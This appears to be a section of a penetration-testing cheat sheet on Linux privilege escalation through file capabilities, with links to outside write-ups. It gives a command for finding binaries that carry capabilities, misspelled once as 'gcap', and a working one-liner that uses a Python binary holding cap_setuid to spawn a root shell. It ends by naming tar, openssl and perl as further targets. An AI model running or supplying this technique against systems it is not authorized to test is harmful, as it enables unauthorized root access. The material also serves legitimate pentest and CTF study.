## Capabilities

#### Capabilities overview

[Linux Privileage Escalation using capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
[SUID vs Capabilities](https://mn3m.info/posts/suid-vs-capabilities/)
[Linux Capabilities Privilege Escalation via OpenSSL with SELinux Enabled and Enforced](https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)

Hunting capabilities - `gcap -r / 2>/dev/null`

* * *

#### Escalation via Capabilities

Example:
`getcap -r / 2>/dev/null` gives the output as follows:
/usr/bin/python2.6 = cap_setuid+ep

`/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'` - this will make us root.

Some common capabilities to look for:
- tar
- openssl
- perl